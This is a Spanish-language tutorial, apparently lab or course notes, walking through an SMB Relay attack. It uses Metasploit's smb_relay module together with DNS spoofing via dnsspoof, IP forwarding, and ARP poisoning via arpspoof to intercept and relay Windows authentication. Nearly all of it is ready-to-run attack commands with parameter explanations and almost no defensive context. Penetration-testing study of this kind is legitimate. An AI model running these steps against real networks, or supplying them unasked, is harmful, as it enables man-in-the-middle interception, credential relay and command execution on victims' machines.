# Ataque de Retransmisión SMB (SMB Relay) con Metasploit

## ¿Qué es SMB Relay?

El ataque **SMB Relay** explota el hecho de que muchos clientes Windows aceptan respuestas SMB sin verificar correctamente la autenticidad del servidor.

**Objetivo:** interceptar solicitudes SMB de una víctima y redirigirlas (retransmitirlas) a otra máquina con el fin de autenticarse con privilegios del usuario víctima.

---

## 1. Iniciar el módulo SMB Relay en Metasploit

```bash
use exploit/windows/smb/smb_relay
```

### Configurar los parámetros:

```bash
set LHOST <IP-atacante>
set LPORT 445
set SHARE fake
set SERVHOST <IP-atacante>
set SMBHOST <IP-objetivo>
```

- `LHOST`: IP de tu máquina atacante.
- `LPORT`: Puerto donde escuchará el módulo, normalmente 445.
- `SHARE`: Nombre del recurso SMB falso (ej: `fake`).
- `SERVHOST`: IP local donde correrá el servidor SMB falso.
- `SMBHOST`: IP del equipo al que queremos retransmitir la autenticación.

---

## 2. Configurar redirección DNS falsa (suplantación de DNS)

### Ver tu interfaz de red:

```bash
ip a     # o ipconfig si estás en Windows
```

> Supongamos que tu interfaz es `eth1`.

### Crear entrada falsa en un archivo DNS:

```bash
echo "<IP-atacante> *.sportsfoo.com" > dns
```

---

## 3. Levantar el servidor DNS falso con dnsspoof

```bash
dnsspoof -i eth1 -f dns
```

- Redirige peticiones DNS para `*.sportsfoo.com` hacia tu IP.
- Intercepta las solicitudes de la víctima y las redirige hacia el atacante.

---

## 4. Activar IP forwarding para permitir que el tráfico fluya

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

## 5. Ataque de ARP Spoofing (envenenamiento ARP)

Suplantar las direcciones MAC para interceptar el tráfico entre víctima y objetivo:

```bash
arpspoof -i eth1 -t <IP-víctima> <IP-gateway>
arpspoof -i eth1 -t <IP-gateway> <IP-víctima>
```

> Este paso hace que el tráfico entre ambos pase por tu equipo (Man-in-the-Middle).

---

## 6. Lanzar el ataque SMB Relay

Una vez que el entorno está preparado:

```bash
exploit
```

> El módulo `smb_relay` capturará las autenticaciones SMB entrantes y las retransmitirá al objetivo (`SMBHOST`) para ejecutar comandos con la sesión autenticada de la víctima.

---

